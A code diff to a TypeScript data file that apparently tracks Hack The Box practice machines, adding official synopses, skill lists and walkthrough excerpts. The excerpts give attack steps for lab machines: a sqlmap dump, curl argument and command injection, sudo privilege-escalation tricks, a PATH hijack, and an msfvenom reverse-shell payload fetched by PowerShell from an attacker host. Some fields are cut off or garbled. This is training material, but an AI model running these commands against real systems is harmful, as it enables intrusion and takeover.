+    "officialWalkthrough": "### 📋 Official Synopsis\nHoliday is definitely one of the more challenging machines on HackTheBox. It touches on many different subjects and demonstrates the severity of stored XSS, which is leveraged to steal the session of an interactive user. The machine is very unique and provides an excellent learning experience.\n\n### 🎯 Core Skills\n- **Bypassing user agent filtering**\n- **Bypassing XSS filtering**\n- **Obtaining data with stored XSS**\n- **Exploiting NOPASSWD files**\n- **Exploiting NPM CLI**\n\n### ⚔️ Foothold Vector\nSQLMap Running SQLMap against the /login page with the command sqlmap -r sqlmap.req --level=5 --risk=3 --dump-all (with sqlmap.req being a sample POST request intercepted by Burp Suite), credentials for a low privilege user are exposed. The hash can be easily looked up online. In this case, hashkiller.co.uk will find the hash.\n\n### 👑 Privilege Escalation\nLinEnum: https://github.com/rebootuser/LinEnum Running LInEnum gathers a large amount of information about the system. Most notably, NOPASSWD is set for the command sudo /usr/bin/npm i * By adding a preinstall option to the package.json file, it is possible to specify a command that will be executed during the package installation process. This can be easily exploited to obtain the flag or a root shell. After creating a package.json file with npm init and adding the command to the script section, simply run the command sudo /usr/bin/npm i /home/algernon/writeup --unsafe"
   },
   {
     "id": "htb-haircut",
@@ -10594,15 +13272,25 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Medium",
     "status": "backlog",
     "tags": [
-      "HTB"
+      "HTB",
+      "HTTP",
+      "based-fuzzing"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/haircut",
     "writeupUrl": "https://0xdf.gitlab.io/tags#haircut",
-    "hint": "Hack The Box Linux machine. Rated Medium difficulty.",
+    "hint": "Haircut is a fairly simple machine, however it does touch on several useful attack vectors. Most notably, this machine demonstrates the risk of user-specified CURL arguments, which still impacts many active services today.",
     "timeSpentSeconds": 0,
     "createdAt": "2017-05-26T16:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "Haircut is a fairly simple machine, however it does touch on several useful attack vectors. Most notably, this machine demonstrates the risk of user-specified CURL arguments, which still impacts many active services today.",
+    "skillsLearned": [
+      "HTTP",
+      "based fuzzing",
+      "Exploiting CURL/Command injection"
+    ],
+    "officialPdf": "21-Haircut_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nHaircut is a fairly simple machine, however it does touch on several useful attack vectors. Most notably, this machine demonstrates the risk of user-specified CURL arguments, which still impacts many active services today.\n\n### 🎯 Core Skills\n- **HTTP**\n- **based fuzzing**\n- **Exploiting CURL/Command injection**\n\n### ⚔️ Foothold Vector\nThe exposed.php file simply CURLs a specified url and displays the result. By adding the -o flag after the url, it gets tacked on to the end of the command, and saves the output to the specified file. This achieved with http://<LAB IP>/writeup.php -o uploads/writeup.php The file must be saved to the uploads directory as the Apache user does not have write permissions to the main website directory. Python is not available on the target, however Python3 is. It is possible to obtain an interactive shell with the command python3 -c 'import pty; pty.spawn(\"/bin/bash\")'\n\n### 👑 Privilege Escalation\nLinEnum: https://github.com/rebootuser/LinEnum Running LinEnum generates a very lengthy output. The main thing that stands out is the SUID file /usr/bin/screen-4.5.0 A quick search finds Exploit-DB 41154. As gcc is broken on the target, libhax.so and rootshell must be compiled locally on the attacking machine and placed in /tmp. The flags can be obtained from /home/maria/Desktop/user.txt and /root/root.txt Exploit: https://www.exploit-db.com/exploits/41154/"
   },
   {
     "id": "htb-joker",
@@ -10613,15 +13301,25 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Hard",
     "status": "backlog",
     "tags": [
+      "Exploiting-tar-wildcards",
       "HTB"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/joker",
     "writeupUrl": "https://0xdf.gitlab.io/tags#joker",
-    "hint": "Hack The Box Linux machine. Rated Hard difficulty.",
+    "hint": "Joker can be a very tough machine for some as it does not give many hints related to the correct path, although the name does suggest a relation to wildcards. It focuses on many different topics and provides an excellent learning experience.",
     "timeSpentSeconds": 0,
     "createdAt": "2017-05-19T10:57:26.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "Joker can be a very tough machine for some as it does not give many hints related to the correct path, although the name does suggest a relation to wildcards. It focuses on many different topics and provides an excellent learning experience.",
+    "skillsLearned": [
+      "Bypassing network restrictions",
+      "Exploiting NOPASSWD files",
+      "Exploiting sudoedit wildcards",
+      "Exploiting tar wildcards"
+    ],
+    "officialPdf": "20-Joker_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nJoker can be a very tough machine for some as it does not give many hints related to the correct path, although the name does suggest a relation to wildcards. It focuses on many different topics and provides an excellent learning experience.\n\n### 🎯 Core Skills\n- **Bypassing network restrictions**\n- **Exploiting NOPASSWD files**\n- **Exploiting sudoedit wildcards**\n- **Exploiting tar wildcards**\n\n### ⚔️ Foothold Vector\nTFTP Exploiting the TFTP server is trivial. Simply using the command tftp 10.10.10.21 will allow files to be transferred to the local machine. Once connected, the command get /etc/squid/squid.conf will get the Squid configuration file, which references /etc/squid/passwords. Downloading the passwords file reveals the login credentials for the proxy, however the password is hashed. Squid After savings the hash into its own file, it can be easily cracked with Hydra and rockyou.txt. The command hashcat -m 1600 hash.txt ./rockyou.txt Setting up a browser with the proxy and attempting to view http://127.0.0.1 reveals a URL shortener.\n\n### 👑 Privilege Escalation\nAlekos Exploit: https://www.exploit-db.com/exploits/37710/ Running the command sudo -l reveals a NOPASSWD file that is run by the user alekos. Using the above exploit, it is possible to create a symbolic link pointing to the authorized_keys file for the alekos user. In /var/www/testing/writeup, the link can be created with the command ln -s /home/alekos/.ssh/authorized_keys layout.html After a symbolic link is created, it is possible to edit the authorized_keys file with the command sudoedit -u alekos /var/www/testing/writeup/layout.html"
   },
   {
     "id": "htb-sneaky",
@@ -10632,15 +13330,28 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Medium",
     "status": "backlog",
     "tags": [
+      "Basic-SQL-injection",
+      "Basic-buffer-overflow",
+      "Enumerating-SNMP",
+      "Exploiting-SUID-files",
       "HTB"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/sneaky",
     "writeupUrl": "https://0xdf.gitlab.io/tags#sneaky",
-    "hint": "Hack The Box Linux machine. Rated Medium difficulty.",
+    "hint": "Sneaky, while not requiring many steps to complete, can be difficult for some users. It explores",
     "timeSpentSeconds": 0,
     "createdAt": "2017-05-14T05:54:28.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "Sneaky, while not requiring many steps to complete, can be difficult for some users. It explores",
+    "skillsLearned": [
+      "Basic SQL injection",
+      "Enumerating SNMP",
+      "Exploiting SUID files",
+      "Basic buffer overflow"
+    ],
+    "officialPdf": "19-Sneaky_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nSneaky, while not requiring many steps to complete, can be difficult for some users. It explores\n\n### 🎯 Core Skills\n- **Basic SQL injection**\n- **Enumerating SNMP**\n- **Exploiting SUID files**\n- **Basic buffer overflow**\n\n### 👑 Privilege Escalation\n. Skills Required ● Intermediate/advanced knowledge of Linux ● Basic understanding of SNMP Skills Learned ● Basic SQL injection ● Enumerating SNMP ● Exploiting SUID files ● Basic buffer overflow exploitation"
   },
   {
     "id": "htb-lazy",
@@ -10651,15 +13362,27 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Medium",
     "status": "backlog",
     "tags": [
-      "HTB"
+      "Exploiting-SUID-binaries",
+      "HTB",
+      "Padding-Oracle-Attack",
+      "to-aid-in"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/lazy",
     "writeupUrl": "https://0xdf.gitlab.io/tags#lazy",
-    "hint": "Hack The Box Linux machine. Rated Medium difficulty.",
+    "hint": "Lazy mainly focuses on the use of padding oracle attacks, however there are several unintended workarounds that are relatively easier, and many users miss the intended attack vector. Lazy also touches on basic exploitation of SUID binaries and using environment variables to aid i",
     "timeSpentSeconds": 0,
     "createdAt": "2017-05-03T13:06:37.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "Lazy mainly focuses on the use of padding oracle attacks, however there are several unintended workarounds that are relatively easier, and many users miss the intended attack vector. Lazy also touches on basic exploitation of SUID binaries and using environment variables to aid in privilege escalation.",
+    "skillsLearned": [
+      "Padding Oracle Attack",
+      "Exploiting SUID binaries",
+      "Using the PATH environment variable",
+      "to aid in"
+    ],
+    "officialPdf": "18-Lazy_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nLazy mainly focuses on the use of padding oracle attacks, however there are several unintended workarounds that are relatively easier, and many users miss the intended attack vector. Lazy also touches on basic exploitation of SUID binaries and using environment variables to aid in privilege escalation.\n\n### 🎯 Core Skills\n- **Padding Oracle Attack**\n- **Exploiting SUID binaries**\n- **Using the PATH environment variable**\n- **to aid in**\n\n### ⚔️ Foothold Vector\nof SUID binaries and using environment variables to aid in privilege escalation. Skills Required ● Basic understanding of cryptography ● Basic/intermediate knowledge of Linux Skills Learned ● Padding Oracle Attack ● Exploiting SUID binaries ● Using the PATH environment variable to aid in exploitation\n\n### 👑 Privilege Escalation\nAfter gaining entry to the target via SSH (and grabbing the user flag at /home/mitsos/user.txt), the next step is to observe the backup binary available in the user's home directory. A quick glimpse shows that it has sticky bits set, which will run it as the root user. Running strings against the binary shows that it executes the command cat /etc/shadow Because a full path to the cat binary is not specified, this specific command is vulnerable to hijacking by modifying the PATH system variable. This can be achieved by setting the working directory as the first option in PATH, with the command export PATH=."
   },
   {
     "id": "htb-brainfuck",
@@ -10670,15 +13393,31 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Insane",
     "status": "backlog",
     "tags": [
-      "HTB"
+      "Enumerating-mail-servers",
+      "Exploit-modification",
+      "Exploiting-Wordpress",
+      "HTB",
+      "SSH-key-brute-forcing"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/brainfuck",
     "writeupUrl": "https://0xdf.gitlab.io/tags#brainfuck",
-    "hint": "Hack The Box Linux machine. Rated Insane difficulty.",
+    "hint": "Brainfuck, while not having any one step that is too difficult, requires many different steps and exploits to complete. A wide range of services, vulnerabilities and techniques are touched on, making this machine a great learning experience for many.",
     "timeSpentSeconds": 0,
     "createdAt": "2017-04-29T11:03:28.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "Brainfuck, while not having any one step that is too difficult, requires many different steps and exploits to complete. A wide range of services, vulnerabilities and techniques are touched on, making this machine a great learning experience for many.",
+    "skillsLearned": [
+      "Enumerating SSL certificates",
+      "Exploiting Wordpress",
+      "Exploit modification",
+      "Enumerating mail servers",
+      "Decoding Vigenere ciphers",
+      "SSH key brute forcing",
+      "RSA decryption techniques"
+    ],
+    "officialPdf": "17-Brainfuck_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nBrainfuck, while not having any one step that is too difficult, requires many different steps and exploits to complete. A wide range of services, vulnerabilities and techniques are touched on, making this machine a great learning experience for many.\n\n### 🎯 Core Skills\n- **Enumerating SSL certificates**\n- **Exploiting Wordpress**\n- **Exploit modification**\n- **Enumerating mail servers**\n- **Decoding Vigenere ciphers**\n- **SSH key brute forcing**\n- **RSA decryption techniques**\n\n### ⚔️ Foothold Vector\nWordpress Gaining access to the Wordpress admin account is trivial using the above exploit. All that is required is setting the target URL and user. The username, admin, can be easily guessed and it is the default username when installing Wordpress. After running the exploit, the admin panel can be accessed at /wp-admin/ After gaining access, some credentials can be found on the Settings > Easy WP SMTP page. The password can be extracted simply by viewing the page source. Mail Server Using the credentials obtained from wordpress, it is trivial to extract the emails from the server. Any IMAP-capable mail client or even Telnet can be used here. The example below will use Telnet. 1.\n\n### 👑 Privilege Escalation\nflag and the file debug.txt contains the P, Q and E values used to do the encryption. By using the above Python script, it is possible to decrypt the ciphertext and get the root flag. To convert the plaintext result from decimal to ASCII, the following command can be used: python -c \"print format(<DECIMAL NUMBER>, 'x').decode('hex')\" The output of the command is the hash value from root.txt."
   },
   {
     "id": "htb-october",
@@ -10689,15 +13428,27 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Medium",
     "status": "backlog",
     "tags": [
+      "Bypassing-ASLR",
+      "Bypassing-NX/DEP",
+      "Exploiting-SUID-files",
       "HTB"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/october",
     "writeupUrl": "https://0xdf.gitlab.io/tags#october",
-    "hint": "Hack The Box Linux machine. Rated Medium difficulty.",
+    "hint": "October is a fairly easy machine to gain an initial foothold on, however it presents a fair challenge for users who have never worked with NX/DEP or ASLR while exploiting buffer overflows.",
     "timeSpentSeconds": 0,
     "createdAt": "2017-04-20T18:13:09.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "October is a fairly easy machine to gain an initial foothold on, however it presents a fair challenge for users who have never worked with NX/DEP or ASLR while exploiting buffer overflows.",
+    "skillsLearned": [
+      "Exploiting SUID files",
+      "Exploiting buffer overflows",
+      "Bypassing NX/DEP",
+      "Bypassing ASLR"
+    ],
+    "officialPdf": "15-October_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nOctober is a fairly easy machine to gain an initial foothold on, however it presents a fair challenge for users who have never worked with NX/DEP or ASLR while exploiting buffer overflows.\n\n### 🎯 Core Skills\n- **Exploiting SUID files**\n- **Exploiting buffer overflows**\n- **Bypassing NX/DEP**\n- **Bypassing ASLR**\n\n### ⚔️ Foothold Vector\non, however it presents a fair challenge for users who have never worked with NX/DEP or ASLR while exploiting buffer overflows. Skills Required ● Intermediate/advanced Linux knowledge ● Intermediate understanding of buffer overflows ● Intermediate knowledge of Linux memory protection mechanisms Skills Learned ● Exploiting SUID files ● Exploiting buffer overflows ● Bypassing NX/DEP ● Bypassing ASLR\n\n### 👑 Privilege Escalation\nLinEnum: https://github.com/rebootuser/LinEnum Running LinEnum reveals a non-standard SUID binary at /usr/local/bin/ovrflw. Passing a large argument to the binary causes a segmentation fault, and it can be assumed that root is obtained by exploiting the buffer overflow. Checksec shows that NX/DEP is enabled. Checking on the target reveals that ASLR is also enabled. Passing a pattern to the binary in gdb finds that there is 112 bytes before the buffer is overflowed and the EIP is overwritten. The command ldd /usr/local/bin/overflw | grep libc will get the libc address of the binary as well as the path to the libc library. The command readelf -s /lib/i386-linux-gnu/libc.so."
   },
   {
     "id": "htb-granny",
@@ -10708,12 +13459,14 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Easy",
     "status": "completed",
     "tags": [
-      "HTB"
+      "CVE-2017-7269",
+      "HTB",
+      "techniques"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/granny",
     "writeupUrl": "https://0xdf.gitlab.io/tags#granny",
-    "hint": "Hack The Box Windows machine. Rated Easy difficulty.",
+    "hint": "Granny, while similar to Grandpa, can be exploited using several different methods. The intended method of solving this machine is the widely-known Webdav upload vulnerability.",
     "timeSpentSeconds": 3600,
     "createdAt": "2017-04-12T16:16:23.000000Z",
     "updatedAt": "2026-08-20T11:30:00.000Z",
@@ -10722,7 +13475,16 @@ export const INITIAL_MACHINES: Machine[] = [
     "userPwnedAt": "2026-08-20T10:00:00.000Z",
     "rootPwnedAt": "2026-08-20T11:30:00.000Z",
     "timeToUserSeconds": 1500,
-    "timeToRootSeconds": 3600
+    "timeToRootSeconds": 3600,
+    "officialSynopsis": "Granny, while similar to Grandpa, can be exploited using several different methods. The intended method of solving this machine is the widely-known Webdav upload vulnerability.",
+    "skillsLearned": [
+      "Identifying known vulnerabilities",
+      "Identifying stable processes",
+      "Basic Windows privilege escalation",
+      "techniques"
+    ],
+    "officialPdf": "14-Granny_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nGranny, while similar to Grandpa, can be exploited using several different methods. The intended method of solving this machine is the widely-known Webdav upload vulnerability.\n\n### 🎯 Core Skills\n- **Identifying known vulnerabilities**\n- **Identifying stable processes**\n- **Basic Windows privilege escalation**\n- **techniques**\n\n### 🛡️ Associated CVEs\n`CVE-2017-7269`\n\n### ⚔️ Foothold Vector\nExecuting the Metasploit module iis_webdav_upload_asp immediately grants a shell. The target appears to be Windows Server 2003 with x86 architecture."
   },
   {
     "id": "htb-grandpa",
@@ -10733,12 +13495,14 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Easy",
     "status": "completed",
     "tags": [
-      "HTB"
+      "CVE-2017-7269",
+      "HTB",
+      "techniques"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/grandpa",
     "writeupUrl": "https://0xdf.gitlab.io/tags#grandpa",
-    "hint": "Hack The Box Windows machine. Rated Easy difficulty.",
+    "hint": "Grandpa is one of the simpler machines on Hack The Box, however it covers the widely-exploited CVE-2017-7269. This vulnerability is trivial to exploit and granted immediate access to thousands of IIS servers around the globe when it became public knowledge.",
     "timeSpentSeconds": 3600,
     "createdAt": "2017-04-12T09:06:56.000000Z",
     "updatedAt": "2026-08-20T11:30:00.000Z",
@@ -10747,7 +13511,16 @@ export const INITIAL_MACHINES: Machine[] = [
     "userPwnedAt": "2026-08-20T10:00:00.000Z",
     "rootPwnedAt": "2026-08-20T11:30:00.000Z",
     "timeToUserSeconds": 1500,
-    "timeToRootSeconds": 3600
+    "timeToRootSeconds": 3600,
+    "officialSynopsis": "Grandpa is one of the simpler machines on Hack The Box, however it covers the widely-exploited CVE-2017-7269. This vulnerability is trivial to exploit and granted immediate access to thousands of IIS servers around the globe when it became public knowledge.",
+    "skillsLearned": [
+      "Identifying known vulnerabilities",
+      "Identifying stable processes",
+      "Basic Windows privilege escalation",
+      "techniques"
+    ],
+    "officialPdf": "13-Grandpa_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nGrandpa is one of the simpler machines on Hack The Box, however it covers the widely-exploited CVE-2017-7269. This vulnerability is trivial to exploit and granted immediate access to thousands of IIS servers around the globe when it became public knowledge.\n\n### 🎯 Core Skills\n- **Identifying known vulnerabilities**\n- **Identifying stable processes**\n- **Basic Windows privilege escalation**\n- **techniques**\n\n### 🛡️ Associated CVEs\n`CVE-2017-7269`\n\n### ⚔️ Foothold Vector\nExecuting the Metasploit module iis_webdav_scstoragepathfromurl immediately grants a shell. The target appears to be Windows Server 2003 with x86 architecture."
   },
   {
     "id": "htb-cronos",
@@ -10758,15 +13531,26 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Medium",
     "status": "backlog",
     "tags": [
-      "HTB"
+      "Command-Injection",
+      "Exploiting-cron-jobs",
+      "HTB",
+      "SQL-Injection"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/cronos",
     "writeupUrl": "https://0xdf.gitlab.io/tags#cronos",
-    "hint": "Hack The Box Linux machine. Rated Medium difficulty.",
+    "hint": "Cronos is a medium Linux machine that focuses mainly on different vectors for",
     "timeSpentSeconds": 0,
     "createdAt": "2017-03-22T14:57:21.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "Cronos is a medium Linux machine that focuses mainly on different vectors for",
+    "skillsLearned": [
+      "SQL Injection",
+      "Command Injection",
+      "Exploiting cron jobs"
+    ],
+    "officialPdf": "11-Cronos_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nCronos is a medium Linux machine that focuses mainly on different vectors for\n\n### 🎯 Core Skills\n- **SQL Injection**\n- **Command Injection**\n- **Exploiting cron jobs**\n\n### ⚔️ Foothold Vector\ndig axfr @10.10.10.13 cronos.htb Login After some trial and error, it appears that the Username field is vulnerable to SQL injection. By commenting out the rest of the statement with the username admin'-- - the login form is bypassed. Welcome It does not take long to figure out that the welcome.php page is vulnerable to command injection. Many different methods work here, however, the simplest is likely just using a semicolon to add additional commands. However, script execution is stopped after the traceroute is run. By intercepting the response in Burp Suite, it is possible to modify the command entirely. After removing the host variable, command injection is now trivial.\n\n### 👑 Privilege Escalation\ncrontab. This machine also includes an introductory-level SQL injection vulnerability Skills required Linux Fundamentals Enumerating ports and services Enumerating DNS Skills learned SQL Injection Command Injection Exploiting cron jobs Enumeration Nmap The Nmap scan reveals an OpenSSH server, a DNS server and an Apache server. Attempting to view the website reveals only the default Apache page. Dig We can identify the domain name of the host using the nslookup utility. The syntax would be as follows: nslookup host [server] This command looks up information for host using the specified server. If the host is an Internet address and the query type is A or PTR, the name of the host is returned."
   },
   {
     "id": "htb-arctic",
@@ -10777,15 +13561,25 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Easy",
     "status": "backlog",
     "tags": [
-      "HTB"
+      "Exploit-modification",
+      "HTB",
+      "and-HTTP-requests"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/arctic",
     "writeupUrl": "https://0xdf.gitlab.io/tags#arctic",
-    "hint": "Hack The Box Windows machine. Rated Easy difficulty.",
+    "hint": "Arctic is fairly straightforward, however the load times on the web server pose a few challenges for exploitation. Basic troubleshooting is required to get the correct exploit functioning properly.",
     "timeSpentSeconds": 0,
     "createdAt": "2017-03-22T07:40:48.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "Arctic is fairly straightforward, however the load times on the web server pose a few challenges for exploitation. Basic troubleshooting is required to get the correct exploit functioning properly.",
+    "skillsLearned": [
+      "Exploit modification",
+      "Troubleshooting Metasploit modules",
+      "and HTTP requests"
+    ],
+    "officialPdf": "9-Arctic_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nArctic is fairly straightforward, however the load times on the web server pose a few challenges for exploitation. Basic troubleshooting is required to get the correct exploit functioning properly.\n\n### 🎯 Core Skills\n- **Exploit modification**\n- **Troubleshooting Metasploit modules**\n- **and HTTP requests**\n\n### ⚔️ Foothold Vector\n. Basic troubleshooting is required to get the correct exploit functioning properly. Skills Required ● Basic knowledge of Windows ● Enumerating ports and services Skills Learned ● Exploit modification ● Troubleshooting Metasploit modules and HTTP requests\n\n### 👑 Privilege Escalation\nOnce a basic command shell has been obtained, it can be elevated to a Meterpreter shell by generating an executable payload with the command msfvenom -p windows/meterpreter/reverse_tcp lhost=<LAB IP> lport=<PORT> -f exe > writeup.exe and then downloaded on the target with the command powershell \"(new-object System.Net.WebClient).Downloadfile('http://<IP>/writeup.exe', 'writeup.exe')\" Once a full Meterpreter shell has been obtained, it is a good idea to migrate to a process with the correct architecture. In this case jrunsvc.exe will work. Running local_exploit_suggester in 64-bit mode reveals only one suggestion; exploit/windows/local/ms10_092_schelevator."
   },
   {
     "id": "htb-tenten",
@@ -10796,15 +13590,27 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Medium",
     "status": "backlog",
     "tags": [
+      "Basic-steganography",
+      "Enumerating-Wordpress",
+      "Exploit-modification",
       "HTB"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/tenten",
     "writeupUrl": "https://0xdf.gitlab.io/tags#tenten",
-    "hint": "Hack The Box Linux machine. Rated Medium difficulty.",
+    "hint": "Tenten is a medium difficulty machine that requires some outside-the-box/CTF-style thinking to complete. It demonstrates the severity of using outdated Wordpress plugins, which is a major attack vector that exists in real life.",
     "timeSpentSeconds": 0,
     "createdAt": "2017-03-22T07:39:37.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "Tenten is a medium difficulty machine that requires some outside-the-box/CTF-style thinking to complete. It demonstrates the severity of using outdated Wordpress plugins, which is a major attack vector that exists in real life.",
+    "skillsLearned": [
+      "Enumerating Wordpress",
+      "Exploit modification",
+      "Basic steganography",
+      "Exploiting NOPASSWD files"
+    ],
+    "officialPdf": "8-Tenten_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nTenten is a medium difficulty machine that requires some outside-the-box/CTF-style thinking to complete. It demonstrates the severity of using outdated Wordpress plugins, which is a major attack vector that exists in real life.\n\n### 🎯 Core Skills\n- **Enumerating Wordpress**\n- **Exploit modification**\n- **Basic steganography**\n- **Exploiting NOPASSWD files**\n\n### ⚔️ Foothold Vector\nBy browsing to 10.10.10.10/index.php/jobs/apply/8/ and modifying the number in the URL, it is possible to find the names of existing applications. Browsing to /13/ reveals an application named HackerAccessGranted. Exploit: https://goo.gl/Vn597m By modifying the above exploit slightly, it is possible to enumerate the file uploaded with the HackerAccessGranted application. Simply change the extensions to jpg, jpeg and png and include 2017 in the year range.\n\n### 👑 Privilege Escalation\nLinEnum: https://github.com/rebootuser/LinEnum Running LinEnum generated a large amount of data to review. Most notably, there is a non-standard NOPASSWD file; /bin/fuckin. This file is just a very simple bash script that executes the given arguments. By running sudo /bin/fuckin bash a root shell is immediately gained. The flag can be obtained from /root/root.txt"
   },
   {
     "id": "htb-bastard",
@@ -10815,15 +13621,27 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Medium",
     "status": "backlog",
     "tags": [
-      "HTB"
+      "Enumerating-CMS-versions",
+      "Exploit-modification",
+      "HTB",
+      "techniques"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/bastard",
     "writeupUrl": "https://0xdf.gitlab.io/tags#bastard",
-    "hint": "Hack The Box Windows machine. Rated Medium difficulty.",
+    "hint": "Bastard is not overly challenging, however it requires some knowledge of PHP in order to modify and use the proof of concept required for initial entry. This machine demonstrates the potential severity of vulnerabilities in content management systems.",
     "timeSpentSeconds": 0,
     "createdAt": "2017-03-18T20:19:32.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "Bastard is not overly challenging, however it requires some knowledge of PHP in order to modify and use the proof of concept required for initial entry. This machine demonstrates the potential severity of vulnerabilities in content management systems.",
+    "skillsLearned": [
+      "Enumerating CMS versions",
+      "Exploit modification",
+      "Basic Windows privilege escalation",
+      "techniques"
+    ],
+    "officialPdf": "7-Bastard_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nBastard is not overly challenging, however it requires some knowledge of PHP in order to modify and use the proof of concept required for initial entry. This machine demonstrates the potential severity of vulnerabilities in content management systems.\n\n### 🎯 Core Skills\n- **Enumerating CMS versions**\n- **Exploit modification**\n- **Basic Windows privilege escalation**\n- **techniques**\n\n### ⚔️ Foothold Vector\nExploit: https://www.exploit-db.com/exploits/41564/ A bit of searching finds Exploit-DB 41564, which exploits a remote code execution vulnerability in Drupal 7.x. The exploit requires a few small modifications to run successfully. There is a syntax error on line 16 as well as line 71. The variables that must be modified are url, endpoint_path, flename and data. The endpoint URL can easily be enumerated by fuzzing. Running the exploit will create the specified PHP file as well as generate user.json and session.json locally. The session file contains valid cookie data for the Drupal admin user, and it is possible to directly paste PHP code into a new Drupal module."
   },
   {
     "id": "htb-optimum",
@@ -10834,12 +13652,14 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Easy",
     "status": "completed",
     "tags": [
-      "HTB"
+      "CVE-2014-6287",
+      "HTB",
+      "techniques"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/optimum",
     "writeupUrl": "https://0xdf.gitlab.io/tags#optimum",
-    "hint": "Hack The Box Windows machine. Rated Easy difficulty.",
+    "hint": "Optimum is a beginner-level machine which mainly focuses on",
     "timeSpentSeconds": 3600,
     "createdAt": "2017-03-18T06:28:47.000000Z",
     "updatedAt": "2026-08-20T11:30:00.000Z",
@@ -10848,7 +13668,16 @@ export const INITIAL_MACHINES: Machine[] = [
     "userPwnedAt": "2026-08-20T10:00:00.000Z",
     "rootPwnedAt": "2026-08-20T11:30:00.000Z",
     "timeToUserSeconds": 1500,
-    "timeToRootSeconds": 3600
+    "timeToRootSeconds": 3600,
+    "officialSynopsis": "Optimum is a beginner-level machine which mainly focuses on",
+    "skillsLearned": [
+      "Identifying vulnerable services",
+      "Identifying known exploits",
+      "Basic Windows privilege escalation",
+      "techniques"
+    ],
+    "officialPdf": "6-Optimum_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nOptimum is a beginner-level machine which mainly focuses on\n\n### 🎯 Core Skills\n- **Identifying vulnerable services**\n- **Identifying known exploits**\n- **Basic Windows privilege escalation**\n- **techniques**\n\n### 🛡️ Associated CVEs\n`CVE-2014-6287`\n\n### ⚔️ Foothold Vector\nThis particular vulnerability happens to have a Metasploit module available, which will be used here as the target system is Windows-based and Metasploit is very handy for Windows privilege escalation. As a side note, a proof of concept is available on exploit-db, although it does require some modification to make functional (https://www.exploit-db.com/exploits/39161/). In this case, exploit/windows/http/rejetto_hfs_exec will do. The user flag can now be obtained from c:\\Documents and Settings\\kostas\\Desktop\\user.txt.txt"
   },
   {
     "id": "htb-beep",
@@ -10859,12 +13688,14 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Easy",
     "status": "completed",
     "tags": [
-      "HTB"
+      "HTB",
+      "based-fuzzing",
+      "vulnerabilities"
     ],
     "certifications": [],
